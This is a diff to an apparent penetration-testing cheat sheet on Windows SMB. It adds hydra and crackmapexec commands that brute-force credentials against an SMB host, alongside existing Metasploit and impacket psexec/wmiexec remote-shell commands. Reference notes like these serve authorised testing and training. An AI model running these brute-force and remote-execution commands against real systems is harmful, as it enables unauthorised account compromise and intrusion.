@@ -95,8 +95,11 @@ msf > use auxiliary/scanner/smb/smb_version
 msf > run
 
 
-# Try to Bruteforce Windows Credentials
+# Bruteforce Windows Credentials (metasploit)
 Metasploit module `auxiliary/scanner/smb/smb_login` 
+
+# Bruteforce Windows Credentials (hydra)
+hydra -L usernames.txt -P passwords.txt 192.168.2.66 smb -V -f
 
 # We can also try to execute commands with the psexec module
 Metasploit module `exploit/windows/smb/psexec`
@@ -124,3 +127,7 @@ python psexec.py <username>@<ip-address> cmd.exe
 # Connect with impacket/wmiexec (uses port TCP 135)
 python wmiexec.py <domainname>/<username>@<ip-address> cmd.exe
 python wmiexec.py <username>@<ip-address> cmd.exe
+
+
+# Bruteforce Credentials (crackmapexec)
+cme smb --continue-on-success -u ./users.txt -p ./passwords.txt -d <domainname> <ip>
